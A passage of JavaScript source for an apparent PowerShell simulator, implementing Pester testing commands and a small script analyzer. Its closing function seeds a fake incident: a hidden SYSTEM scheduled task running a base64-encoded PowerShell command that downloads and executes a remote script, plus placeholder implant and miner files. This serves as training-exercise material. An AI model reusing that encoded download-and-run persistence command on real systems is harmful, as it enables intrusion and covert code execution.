    st.current = it;
    st.calls = [];
    var failure = setupError;
    var errBefore = session.errors.length;
    try {
      if (!failure) {
        chain(node).forEach(function (n) { n.beforeEach.forEach(function (sb) { E.execBlock(sb.block, pctx(session, itScope), []); }); });
        E.execBlock(it.sb.block, pctx(session, itScope), []);
        // An error inside the test (a missing command, a failed cmdlet) fails it too.
        if (session.errors.length > errBefore) { var fe = session.errors[errBefore]; failure = err(fe.message, fe.category); failure.line = fe.line; }
      }
    } catch (e) {
      if (e instanceof E.PSError) failure = e;
      else if (!(e instanceof E.ReturnSignal)) { st.current = prevCur; throw e; }
    } finally {
      try { chain(node).reverse().forEach(function (n) { n.afterEach.forEach(function (sb) { E.execBlock(sb.block, pctx(session, itScope), []); }); }); } catch (e2) { if (!(e2 instanceof E.PSError)) throw e2; }
      clearMocks(session, it);
      st.current = prevCur;
    }
    res.ms += ms;
    if (!failure) { res.passed++; res.tests.push({ name: name, path: path, result: "Passed" }); say(session, pad + "[+] " + name + " " + ms + "ms (" + (ms - 1) + "ms|1ms)", "c-green"); return; }
    res.failed++;
    res.tests.push({ name: name, path: path, result: "Failed", message: failure.message });
    say(session, pad + "[-] " + name + " " + ms + "ms (" + (ms - 1) + "ms|1ms)", "c-red");
    failure.message.split("\n").forEach(function (l) { say(session, pad + " " + l, "c-red"); });
    if (failure.line) say(session, pad + " at line " + failure.line, "c-red");
  }
  function summary(session, res, invoked) {
    var sys = session.system;
    say(session, "Tests completed in " + (res.ms + 11) + "ms", "");
    say(session, "Tests Passed: " + res.passed + ", Failed: " + res.failed + ", Skipped: " + res.skipped + ", Inconclusive: 0, NotRun: 0", res.failed ? "c-red" : "c-green");
    sys.pesterRuns = (sys.pesterRuns || []).concat([{ passed: res.passed, failed: res.failed, skipped: res.skipped, tests: res.tests.slice(), invoked: invoked }]);
  }
  C("Describe", PESTER, [p("Name", 0), p("Fixture", 1), p("Tag"), sw("Skip"), p("ForEach")], function (b, input, ctx) { return block(ctx, "Describe", toStr(b.name), b.fixture, b.skip); }, { synopsis: "Pester: groups tests. Describe 'Thing' { It 'does x' { ... } }" });
  C("Context", PESTER, [p("Name", 0), p("Fixture", 1), p("Tag"), sw("Skip")], function (b, input, ctx) { return block(ctx, "Context", toStr(b.name), b.fixture, b.skip); }, { synopsis: "Pester: a sub-group of tests inside a Describe." });
  C("It", PESTER, [p("Name", 0), p("Test", 1), p("TestCases"), p("ForEach"), sw("Skip"), p("Tag")], function (b, input, ctx) {
    needPester(ctx, "It");
    var st = pst(ctx.session);
    if (!st.discovering) throw err("It must be called inside a Describe or Context block.", "InvalidOperation");
    var cases = b.testcases !== undefined ? enumerate(b.testcases) : b.foreach !== undefined ? enumerate(b.foreach) : [null];
    st.discovering.children.push({ kind: "It", name: toStr(b.name), sb: b.test, skip: !!b.skip, cases: cases.map(function (c) { return c instanceof PSHashtable ? c : c === null ? null : c; }) });
    return [];
  }, { synopsis: "Pester: one test. It 'adds numbers' { Add 1 2 | Should -Be 3 }" });
  ["BeforeAll", "BeforeEach", "AfterEach", "AfterAll"].forEach(function (nm) {
    C(nm, PESTER, [p("Scriptblock", 0)], function (b, input, ctx) {
      needPester(ctx, nm);
      var st = pst(ctx.session);
      var target = st.discovering;
      if (!target) throw err(nm + " must be called inside a Describe or Context block.", "InvalidOperation");
      target[nm.charAt(0).toLowerCase() + nm.slice(1)].push(b.scriptblock);
      return [];
    }, { synopsis: "Pester: setup/teardown code (" + nm + ")." });
  });
  var SHOULD_OPS = ["Be", "BeExactly", "BeNullOrEmpty", "BeTrue", "BeFalse", "Contain", "HaveCount", "Match", "MatchExactly", "BeLike", "Throw", "BeOfType", "BeGreaterThan", "BeLessThan", "BeGreaterOrEqual", "BeLessOrEqual", "Exist", "BeIn", "Invoke"];
  // A failed assertion ends the test (it's a terminating error, like Pester's).
  function shouldFail(msg) { var e = err(msg, "ShouldFailure", { errorId: "PesterAssertionFailed" }); e.scriptTerminating = true; return e; }
  C("Should", PESTER, SHOULD_OPS.map(sw).concat([p("ExpectedValue", 0, { aliases: ["ExpectedMessage", "RegularExpression", "ExpectedType", "CommandName"] }), p("ActualValue"), sw("Not"), p("Because"), p("Times"), sw("Exactly"), p("ParameterFilter"), p("ExceptionType"), p("ErrorId")]), function (b, input, ctx) {
    needPester(ctx, "Should");
    var op = SHOULD_OPS.filter(function (o) { return b[lc(o)]; })[0];
    if (!op) throw err("Should needs an operator, like Should -Be 5 or Should -BeTrue.", "InvalidArgument");
    var items = input === null ? (b.actualvalue !== undefined ? [b.actualvalue] : []) : input;
    var actual = items.length === 0 ? null : items.length === 1 ? items[0] : items;
    var exp = b.expectedvalue, not = !!b.not;
    var because = b.because !== undefined ? ", because " + toStr(b.because) : "";
    var ok, msg;
    function eq(a, x, cs) {
      if (Array.isArray(a) || Array.isArray(x)) { var aa = enumerate(a), xx = enumerate(x); return aa.length === xx.length && aa.every(function (v, i) { return eq(v, xx[i], cs); }); }
      if (typeof a === "string" && typeof x === "string") return cs ? a === x : lc(a) === lc(x);
      return E.cmpEq(a, x, !cs);
    }
    switch (op) {
      case "Be": case "BeExactly":
        ok = eq(actual, exp, op === "BeExactly");
        msg = not ? "Expected " + fmt(exp) + " to be different from the actual value" + because + ", but got the same value." : "Expected " + fmt(exp) + because + ", but got " + fmt(actual) + ".";
        break;
      case "BeNullOrEmpty":
        ok = actual === null || actual === "" || (Array.isArray(actual) && actual.length === 0);
        msg = not ? "Expected a value" + because + ", but got $null or empty." : "Expected $null or empty" + because + ", but got " + fmt(actual) + ".";
        break;
      case "BeTrue": ok = toBool(actual); msg = not ? "Expected $false" + because + ", but got " + fmt(actual) + "." : "Expected $true" + because + ", but got " + fmt(actual) + "."; break;
      case "BeFalse": ok = !toBool(actual); msg = not ? "Expected $true" + because + ", but got " + fmt(actual) + "." : "Expected $false" + because + ", but got " + fmt(actual) + "."; break;
      case "Contain":
        ok = enumerate(items).some(function (v) { return eq(v, exp, false); });
        msg = not ? "Expected " + fmt(exp) + " to not be found in collection " + fmt(items) + because + ", but it was found." : "Expected " + fmt(exp) + " to be found in collection " + fmt(items) + because + ", but it was not found.";
        break;
      case "HaveCount":
        ok = items.length === toNumber(exp);
        msg = not ? "Expected a collection with size different from " + toNumber(exp) + because + ", but got collection with that size " + fmt(items) + "." : "Expected a collection with size " + toNumber(exp) + because + ", but got collection with size " + items.length + " " + fmt(items) + ".";
        break;
      case "Match": case "MatchExactly":
        ok = E.netRegex(toStr(exp), op === "Match" ? "i" : "").test(toStr(actual));
        msg = not ? "Expected regular expression " + fmt(toStr(exp)) + " to not match " + fmt(actual) + because + ", but it did match." : "Expected regular expression " + fmt(toStr(exp)) + " to match " + fmt(actual) + because + ", but it did not match.";
        break;
      case "BeLike":
        ok = E.wildcardRe(toStr(exp)).test(toStr(actual));
        msg = not ? "Expected like wildcard " + fmt(toStr(exp)) + " to not match " + fmt(actual) + because + ", but it did match." : "Expected like wildcard " + fmt(toStr(exp)) + " to match " + fmt(actual) + because + ", but it did not match.";
        break;
      case "BeIn":
        ok = enumerate(exp).some(function (v) { return eq(actual, v, false); });
        msg = "Expected collection " + fmt(enumerate(exp)) + " to contain " + fmt(actual) + because + ", but it was not found.";
        break;
      case "BeGreaterThan": ok = E.cmpOrder(actual, exp) > 0; msg = "Expected the actual value to be greater than " + fmt(exp) + because + ", but got " + fmt(actual) + "."; break;
      case "BeLessThan": ok = E.cmpOrder(actual, exp) < 0; msg = "Expected the actual value to be less than " + fmt(exp) + because + ", but got " + fmt(actual) + "."; break;
      case "BeGreaterOrEqual": ok = E.cmpOrder(actual, exp) >= 0; msg = "Expected the actual value to be greater than or equal to " + fmt(exp) + because + ", but got " + fmt(actual) + "."; break;
      case "BeLessOrEqual": ok = E.cmpOrder(actual, exp) <= 0; msg = "Expected the actual value to be less than or equal to " + fmt(exp) + because + ", but got " + fmt(actual) + "."; break;
      case "BeOfType":
        var tn = exp instanceof E.PSType ? exp.name : toStr(exp).replace(/^\[|\]$/g, "");
        ok = E.isType(actual, tn);
        msg = "Expected the value to have type [" + tn + "] or any of its subtypes" + because + ", but got " + fmt(actual) + " with type [" + E.typeOfValue(actual) + "].";
        break;
      case "Exist":
        ok = !!fs.get(ctx.session.system, toStr(actual)) || fs.isDir(ctx.session.system, toStr(actual));
        msg = "Expected path " + fmt(toStr(actual)) + " to exist" + because + ", but it did not exist.";
        break;
      case "Throw":
        if (!(actual instanceof ScriptBlock)) throw err("Should -Throw needs a script block as input: { code } | Should -Throw");
        var thrown = null;
        try { E.callScriptBlockList(actual, ctx, []); }
        catch (e) { if (e instanceof E.PSError) thrown = e; else throw e; }
        if (not) { ok = !thrown; msg = "Expected no exception to be thrown" + because + ", but an exception \"" + (thrown && thrown.message) + "\" was thrown."; break; }
        if (!thrown) { ok = false; msg = "Expected an exception" + (exp !== undefined ? " with message like " + fmt(toStr(exp)) : "") + " to be thrown" + because + ", but no exception was thrown."; break; }
        ok = exp === undefined || E.wildcardRe(toStr(exp)).test(thrown.message);
        msg = "Expected an exception with message like " + fmt(toStr(exp)) + " to be thrown" + because + ", but the message was " + fmt(thrown.message) + ".";
        if (not) ok = !ok;
        return check(ok, msg);
      case "Invoke":
        var cmd = toStr(exp), st = pst(ctx.session);
        var calls = st.calls.filter(function (c) { return lc(c.name) === lc(cmd); });
        if (b.parameterfilter instanceof ScriptBlock) calls = calls.filter(function (c) { return toBool(E.unwrap(runWithVars(ctx, b.parameterfilter, c.vars))); });
        var times = b.times !== undefined ? toNumber(b.times) : 1;
        ok = b.exactly ? calls.length === times : calls.length >= times;
        msg = not ? "Expected " + cmd + " not to be called" + because + ", but it was called " + calls.length + " times" : b.exactly ? "Expected " + cmd + " to be called " + times + " times exactly" + because + ", but was called " + calls.length + " times" : "Expected " + cmd + " to be called at least " + times + " times" + because + ", but was called " + calls.length + " times";
        if (not) { ok = calls.length === 0; return check(ok, msg); }
        return check(ok, msg);
    }
    if (not) ok = !ok;
    return check(ok, msg);
    function check(pass, m) { if (!pass) throw shouldFail(m); return []; }
  }, { synopsis: "Pester: an assertion. $result | Should -Be 5; { code } | Should -Throw; $list | Should -Contain 'x'" });
  function runWithVars(ctx, sb, vars) {
    var scope = new E.Scope(ctx.scope);
    Object.keys(vars).forEach(function (k) { scope.setLocal(vars[k].name, vars[k].value); });
    return E.callScriptBlockList(sb, pctx(ctx.session, scope, { inMock: true }), []);
  }
  function clearMocks(session, owner) {
    (owner.mocks || []).forEach(function (m) {
      var d = session.mocks && session.mocks[m.key];
      if (!d) return;
      d.variants = d.variants.filter(function (v) { return v !== m.variant; });
      if (!d.variants.length) delete session.mocks[m.key];
    });
    owner.mocks = [];
  }
  C("Mock", PESTER, [p("CommandName", 0), p("MockWith", 1), p("ParameterFilter"), sw("Verifiable"), p("ModuleName")], function (b, input, ctx) {
    needPester(ctx, "Mock");
    var session = ctx.session, st = pst(session);
    if (!st.current) throw err("Mock can only be used inside BeforeAll, BeforeEach or It (in Pester 5).", "InvalidOperation");
    var name = toStr(b.commandname), key = lc(name);
    var found = E.findCommand(name, pctx(session, ctx.scope, { inMock: true }));
    if (!found) throw err("Could not find Command " + name, "ObjectNotFound");
    var spec = found.kind === "cmdlet" ? (found.def.params || []).map(function (q) { return { name: q.name, type: q.type, position: q.position, aliases: q.aliases }; })
      : found.def.params.map(function (q, i) { return { name: q.name, type: q.type === "switch" ? "switch" : null, position: q.position != null ? q.position : i }; });
    session.mocks = session.mocks || {};
    var d = session.mocks[key];
    if (!d) {
      d = session.mocks[key] = { name: found.def.name || name, module: PESTER, params: spec, allowExtra: true, variants: [],
        run: function (bound, inp, mctx) {
          var vars = {};
          spec.forEach(function (q) { var v = bound[lc(q.name)]; vars[lc(q.name)] = { name: q.name, value: v === undefined ? (q.type === "switch" ? false : null) : v }; });
          pst(session).calls.push({ name: d.name, vars: vars });
          var pick = null;
          for (var i = d.variants.length - 1; i >= 0; i--) {
            var v = d.variants[i];
            if (v.filter && !toBool(E.unwrap(runWithVars(mctx, v.filter, vars)))) continue;
            pick = v; break;
          }
          if (!pick) {
            // no mock matched: call the real command
            var real = E.findCommand(name, pctx(session, mctx.scope, { inMock: true }));
            return real.kind === "cmdlet" ? real.def.run(bound, inp, mctx) : [];
          }
          return pick.body ? runWithVars(mctx, pick.body, vars) : [];
        } };
    }
    var variant = { body: b.mockwith instanceof ScriptBlock ? b.mockwith : null, filter: b.parameterfilter instanceof ScriptBlock ? b.parameterfilter : null };
    d.variants.push(variant);
    st.current.mocks = (st.current.mocks || []).concat([{ key: key, variant: variant }]);
    return [];
  }, { synopsis: "Pester: replaces a command with fake behaviour during a test. Mock Get-Service { [pscustomobject]@{ Name = 'x'; Status = 'Stopped' } }" });
  C("Invoke-Pester", PESTER, [p("Path", 0), sw("PassThru"), p("Output"), sw("CI"), p("TagFilter"), p("Configuration")], function (b, input, ctx) {
    needPester(ctx, "Invoke-Pester");
    var session = ctx.session, sys = session.system, st = pst(session);
    var paths = b.path !== undefined ? names(b.path) : ["."];
    var files = [];
    paths.forEach(function (pth) {
      var f = fs.get(sys, pth);
      if (f) { files.push(fs.normPath(sys, pth).display); return; }
      if (!fs.isDir(sys, pth)) { E.writeCmdletError(ctx, "Cannot find path '" + fs.normPath(sys, pth).display + "' because it does not exist.", "ObjectNotFound", pth); return; }
      var pre = fs.normPath(sys, pth).key; pre = pre ? pre + "\\" : "";
      Object.keys(sys.files).sort().forEach(function (k) { if (k.indexOf(pre) === 0 && /\.tests\.ps1$/.test(k)) files.push(fs.normPath(sys, sys.files[k].name).display); });
    });
    var output = b.output !== undefined ? lc(toStr(b.output)) : "detailed";
    var prev = st.invoke;
    st.invoke = { roots: [], output: output };
    var res = newResults();
    try {
      say(session, "Starting discovery in " + files.length + " files.");
      files.forEach(function (f) { lib.runPs1(ctx, f, null, null, false); });
      var n = st.invoke.roots.reduce(function (a, r) { return a + countTests(r); }, 0);
      say(session, "Discovery found " + n + " tests in " + (12 + files.length * 9) + "ms.");
      say(session, "Running tests.");
      st.invoke.roots.forEach(function (r) { runNode(session, r, r.scope, res, 0); });
      summary(session, res, true);
    } finally { st.invoke = prev; }
    if (b.ci && res.failed) session.global.setLocal("LASTEXITCODE", res.failed);
    if (!b.passthru) return [];
    function testObj(t) { return obj("Pester.Test", { Name: t.name, ExpandedPath: t.path, Result: t.result, Passed: t.result === "Passed", ErrorRecord: t.message ? [t.message] : [] }); }
    var run = obj("Pester.Run", { Result: res.failed ? "Failed" : "Passed", FailedCount: res.failed, PassedCount: res.passed, SkippedCount: res.skipped, NotRunCount: 0, TotalCount: res.tests.length,
      Duration: res.ms + 11, Tests: res.tests.map(testObj), Failed: res.tests.filter(function (t) { return t.result === "Failed"; }).map(testObj), Passed: res.tests.filter(function (t) { return t.result === "Passed"; }).map(testObj) });
    run.toStringFn = function () { return "[+] " + files.join(", "); };
    return [run];
  }, { synopsis: "Runs the *.Tests.ps1 files in a folder. -PassThru returns the results (FailedCount, PassedCount...).", examples: ["Invoke-Pester -Path .\\tests -Output Detailed", "$r = Invoke-Pester .\\tests -PassThru; $r.FailedCount"] });
  lib.listTypes["Pester.Run"] = true;
  lib.views["Pester.Test"] = ["Result", "ExpandedPath"];

  /* ================================================================== PSScriptAnalyzer (a handful of real rules) */
  var APPROVED = null;
  function approvedVerbs(ctx) {
    if (!APPROVED) { APPROVED = {}; lib.cmdlets["get-verb"].run({}, null, ctx).forEach(function (v) { APPROVED[lc(toStr(v.get("Verb")))] = true; }); }
    return APPROVED;
  }
  var RULES = [
    ["PSAvoidUsingCmdletAliases", "Warning", "Use the full cmdlet name, not an alias."],
    ["PSAvoidUsingWriteHost", "Warning", "Avoid Write-Host: use Write-Output, Write-Verbose or Write-Information."],
    ["PSAvoidUsingInvokeExpression", "Warning", "Avoid Invoke-Expression: it runs any text as code."],
    ["PSAvoidUsingPlainTextForPassword", "Warning", "Password parameters should be SecureString or PSCredential."],
    ["PSAvoidUsingConvertToSecureStringWithPlainText", "Error", "ConvertTo-SecureString -AsPlainText exposes the secret in the script."],
    ["PSAvoidUsingUsernameAndPasswordParams", "Error", "Use one PSCredential parameter instead of user name and password parameters."],
    ["PSUseApprovedVerbs", "Warning", "Function names should use approved verbs (Get-Verb)."],
    ["PSUseShouldProcessForStateChangingFunctions", "Warning", "Functions that change things should support -WhatIf/-Confirm (SupportsShouldProcess)."],
    ["PSAvoidUsingEmptyCatchBlock", "Warning", "Empty catch blocks hide errors."],
    ["PSAvoidGlobalVars", "Warning", "Avoid global variables."]
  ];
  function analyze(ctx, text, scriptName) {
    var ast;
    try { ast = E.parse(text); }
    catch (e) {
      if (e instanceof E.ParseError) return [diag("ParseError", "ParseError", scriptName, e.line, e.message)];
      throw e;
    }
    var out = [];
    var STATE_VERBS = { "new": 1, "set": 1, "remove": 1, "start": 1, "stop": 1, "restart": 1, "reset": 1, "update": 1, "clear": 1, "disable": 1, "enable": 1 };
    function add(rule, line, msg) { var r = RULES.filter(function (x) { return x[0] === rule; })[0]; out.push(diag(rule, r[1], scriptName, line, msg)); }
    function checkParams(params, fnName, line) {
      var pw = null, user = null;
      (params || []).forEach(function (p) {
        if (/^(password|passphrase|passwd|pwd|pass)$|password$/i.test(p.name)) { pw = p; if (!p.type || /^string$/i.test(p.type)) add("PSAvoidUsingPlainTextForPassword", line, "Parameter '$" + p.name + "' should not use String type but either SecureString or PSCredential, otherwise it increases the chance to expose this sensitive information."); }
        if (/^(username|user|login)$/i.test(p.name)) user = p;
      });
      if (pw && user && fnName) add("PSAvoidUsingUsernameAndPasswordParams", line, "Function '" + fnName + "' has both Username and Password parameters. Either set the type of the Password parameter to SecureString or replace the Username and Password parameters with a Credential parameter of type PSCredential.");
    }
    function walk(n, line, fnName) {
      if (!n || typeof n !== "object") return;
      if (Array.isArray(n)) { n.forEach(function (x) { walk(x, line, fnName); }); return; }
      if (n.line) line = n.line;
      if (n.t === "cmd" && n.name) {
        var nm = n.name, low = lc(nm);
        var target = (lib.aliases[low] || null);
        if (target) add("PSAvoidUsingCmdletAliases", line, "'" + nm + "' is an alias of '" + target + "'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content.");
        var real = lc(target || nm);
        if (real === "write-host" && !(fnName && /^show-/i.test(fnName))) add("PSAvoidUsingWriteHost", line, "File '" + scriptName + "' uses Write-Host. Avoid using Write-Host because it might not work in all hosts, does not work when there is no host, and (prior to PS 5.0) cannot be suppressed, captured, or redirected. Instead, use Write-Output, Write-Verbose, or Write-Information.");
        if (real === "invoke-expression") add("PSAvoidUsingInvokeExpression", line, "Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead.");
        if (real === "convertto-securestring" && (n.args || []).some(function (a) { return a.t === "param" && /^asplaintext$/i.test(a.name); }))
          add("PSAvoidUsingConvertToSecureStringWithPlainText", line, "File '" + scriptName + "' uses ConvertTo-SecureString with plaintext. This will expose secure information. Encrypted standard strings should be used instead.");
      }
      if (n.t === "function") {
        var fname = n.name, parts = fname.split("-");
        if (parts.length > 1 && !approvedVerbs(ctx)[lc(parts[0])]) add("PSUseApprovedVerbs", n.line, "The cmdlet '" + fname + "' uses an unapproved verb.");
        var binding = n.def && n.def.binding;
        var sp = binding && binding.some(function (a) { return /supportsshouldprocess/i.test(a.name || ""); });
        if (parts.length > 1 && STATE_VERBS[lc(parts[0])] && !sp) add("PSUseShouldProcessForStateChangingFunctions", n.line, "Function '" + fname + "' has verb that could change system state. Therefore, the function has to support 'ShouldProcess'.");
        checkParams(n.def && n.def.params, fname, n.line);
        walk(n.def, n.line, fname);
        return;
      }
      if (n.t === "param" && !fnName) checkParams(n.params, null, n.line);
      if (n.t === "try") (n.catches || []).forEach(function (c) { if (!c.body.stmts.length) add("PSAvoidUsingEmptyCatchBlock", c.body.line || line, "Empty catch block is used. Please use Write-Error or throw statements in catch blocks."); });
      if (n.t === "var" && lc(n.scope || "") === "global") add("PSAvoidGlobalVars", line, "Found global variable 'global:" + n.name + "'.");
      Object.keys(n).forEach(function (k) { if (k !== "line" && k !== "t" && k !== "text") walk(n[k], line, fnName); });
    }
    walk(ast, 1, null);
    var seen = {};
    out = out.filter(function (d) { var k = d.get("RuleName") + "|" + d.get("Line") + "|" + d.get("Message"); if (seen[k]) return false; seen[k] = true; return true; });
    out.sort(function (a, b) { return a.get("Line") - b.get("Line"); });
    return out;
  }
  function diag(rule, sev, script, line, msg) {
    return obj("Microsoft.Windows.PowerShell.ScriptAnalyzer.Generic.DiagnosticRecord", { RuleName: rule, Severity: sev, ScriptName: script, Line: line || 1, Message: msg, ScriptPath: script });
  }
  lib.views["Microsoft.Windows.PowerShell.ScriptAnalyzer.Generic.DiagnosticRecord"] = ["RuleName", "Severity", "ScriptName", "Line", "Message"];
  lib.analyze = analyze;
  C("Invoke-ScriptAnalyzer", "PSScriptAnalyzer", [p("Path", 0), p("ScriptDefinition"), p("Severity"), p("IncludeRule"), p("ExcludeRule"), sw("Recurse"), p("Settings"), sw("Fix")], function (b, input, ctx) {
    lib.requireModule(ctx, "psscriptanalyzer", "Invoke-ScriptAnalyzer");
    var sys = ctx.session.system, out = [];
    if (b.scriptdefinition !== undefined) out = analyze(ctx, toStr(b.scriptdefinition), "");
    else {
      names(b.path).forEach(function (pth) {
        var f = fs.get(sys, pth);
        if (f) { out = out.concat(analyze(ctx, lib.splitSig(f.content).body, fs.normPath(sys, pth).display.split("\\").pop())); return; }
        if (!fs.isDir(sys, pth)) { E.writeCmdletError(ctx, "Cannot find path '" + fs.normPath(sys, pth).display + "' because it does not exist.", "ObjectNotFound", pth); return; }
        var pre = fs.normPath(sys, pth).key; pre = pre ? pre + "\\" : "";
        Object.keys(sys.files).sort().forEach(function (k) {
          if (k.indexOf(pre) !== 0 || !/\.ps[dm]?1$/.test(k)) return;
          if (!b.recurse && k.slice(pre.length).indexOf("\\") >= 0) return;
          var ff = sys.files[k];
          out = out.concat(analyze(ctx, lib.splitSig(ff.content).body, ff.name.split("\\").pop()).map(function (d) { d.set("ScriptPath", fs.normPath(sys, ff.name).display); return d; }));
        });
      });
    }
    if (b.severity !== undefined) { var sv = names(b.severity).map(lc); out = out.filter(function (d) { return sv.indexOf(lc(d.get("Severity"))) >= 0; }); }
    if (b.includerule !== undefined) out = out.filter(function (d) { return names(b.includerule).some(function (r) { return E.wildcardRe(r).test(d.get("RuleName")); }); });
    if (b.excluderule !== undefined) out = out.filter(function (d) { return !names(b.excluderule).some(function (r) { return E.wildcardRe(r).test(d.get("RuleName")); }); });
    return out;
  }, { synopsis: "Checks scripts for risky or bad practices (aliases, Write-Host, plain-text passwords, Invoke-Expression...).", examples: ["Invoke-ScriptAnalyzer -Path .\\scripts", "Invoke-ScriptAnalyzer -Path .\\deploy.ps1 -Severity Error, Warning"] });
  C("Get-ScriptAnalyzerRule", "PSScriptAnalyzer", [p("Name", 0)], function (b, input, ctx) {
    lib.requireModule(ctx, "psscriptanalyzer", "Get-ScriptAnalyzerRule");
    return RULES.filter(function (r) { return b.name === undefined || names(b.name).some(function (n) { return E.wildcardRe(n).test(r[0]); }); })
      .map(function (r) { return obj("Microsoft.Windows.PowerShell.ScriptAnalyzer.Generic.RuleInfo", { RuleName: r[0], Severity: r[1], Description: r[2] }); });
  }, { synopsis: "Lists the analyzer's rules." });
  lib.views["Microsoft.Windows.PowerShell.ScriptAnalyzer.Generic.RuleInfo"] = ["RuleName", "Severity", "Description"];
  function incidentExtras(sys) {
    var ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYANgAvAGEALgBwAHMAMQAnACkA";
    if (!sys.tasks.some(function (t) { return t.TaskName === "WindowsUpdateCheck"; })) {
      sys.tasks.push({ TaskPath: "\\", TaskName: "WindowsUpdateCheck", State: "Ready", Actions: [{ Execute: "powershell.exe", Arguments: "-NoP -W Hidden -Enc " + ENC, WorkingDirectory: null }],
        Triggers: [{ kind: "AtStartup" }], Principal: { UserId: "SYSTEM", RunLevel: "Highest", LogonType: "ServiceAccount" }, Author: "KC-WIN-01\\temp.admin", Description: "", LastRunTime: Date.UTC(2026, 10, 10, 2, 25), LastTaskResult: 0 });
    }
    if (!fs.get(sys, "C:\\Users\\Public\\svc.exe")) fs.write(sys, "C:\\Users\\Public\\svc.exe", "MZ svc implant build 4471\n");
    if (!fs.get(sys, "C:\\Users\\Public\\updater.exe")) fs.write(sys, "C:\\Users\\Public\\updater.exe", "MZ xmrig 6.21.0 miner\n");
  }
})(typeof window !== "undefined" ? window : globalThis);
